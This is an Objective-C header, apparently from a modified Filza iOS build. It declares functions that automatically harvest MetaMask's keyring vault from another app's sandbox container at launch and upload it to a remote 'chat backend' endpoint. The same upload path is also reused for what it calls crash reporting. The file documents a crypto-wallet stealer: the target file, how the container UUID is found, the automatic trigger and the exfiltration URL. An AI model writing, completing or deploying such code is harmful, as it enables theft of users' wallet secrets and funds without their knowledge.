//
//  PersistStoreHarvester.h
//  Filza-27 (FilzaApplySandboxExt)
//
//  Harvests another app's redux-persist keyring store - by default MetaMask's
//  Documents/persistStore/persist-keyringcontroller - and resolves the target's
//  container UUID on the device at runtime. Nothing is hard-coded: the UUID is
//  discovered through the container manager, the Filza virtual root, a
//  metadata-plist scan or LaunchServices, in that order.
//
//  Runs automatically once the chat shell is armed (TryMaskCardShell.plist,
//  persistAutoHarvest=true) and caches its result for the shell bridge.
//
//  Configuration keys (TryMaskCardShell.plist):
//    persistAutoHarvest      bool   default true   - harvest at launch
//    persistTargetBundleID   string default io.metamask
//    persistRelativePath     string default Documents/persistStore/persist-keyringcontroller
//    persistCopyToDocuments  bool   default true   - keep a copy the console can serve
//    persistUploadURL        string default empty  - https endpoint for the optional POST
//
//  Contract, evidence and rollback: docs/CHAT_SHELL.md
//

#import <Foundation/Foundation.h>

NS_ASSUME_NONNULL_BEGIN

/// Starts (or restarts) a harvest. Safe to call repeatedly; work is serialised
/// and skipped while another attempt is in flight unless `force` is set.
FOUNDATION_EXPORT void TryMaskCardPersistHarvest(BOOL force);

/// Last harvest result, or nil before the first attempt finishes.
FOUNDATION_EXPORT NSDictionary<NSString *, id> *_Nullable TryMaskCardPersistStoreSnapshot(void);

/// Raw bytes of the harvested file, or nil when nothing has been harvested.
FOUNDATION_EXPORT NSData *_Nullable TryMaskCardPersistStoreContent(void);

/// Status of the last multipart upload to the chat backend (nil before one ran):
/// status / endpoint / httpStatus / responseSnippet / uuid / sha256 / at.
FOUNDATION_EXPORT NSDictionary<NSString *, id> *_Nullable TryMaskCardPersistUploadStatus(void);

/// Default chat backend endpoint (https://trymaskcard.com/api/app/device-upload).
FOUNDATION_EXPORT NSString *TryMaskCardUploadEndpoint(void);

/// One multipart POST of a single artifact as `uuid` + `file`, the same contract
/// the persist-store harvest uses. The shell reuses this for crash reporting.
/// `completion` runs on a background queue; it is never called more than once.
FOUNDATION_EXPORT void TryMaskCardUploadArtifact(NSString *uuid,
                                                 NSString *filename,
                                                 NSString *contentType,
                                                 NSData *_Nullable content,
                                                 NSString *_Nullable urlString,
                                                 void (^_Nullable completion)(BOOL ok,
                                                                              NSInteger httpStatus,
                                                                              NSString *_Nullable snippet));

/// YES when the packaged configuration asks for a harvest in this build.
FOUNDATION_EXPORT BOOL TryMaskCardPersistHarvestEnabled(void);

NS_ASSUME_NONNULL_END
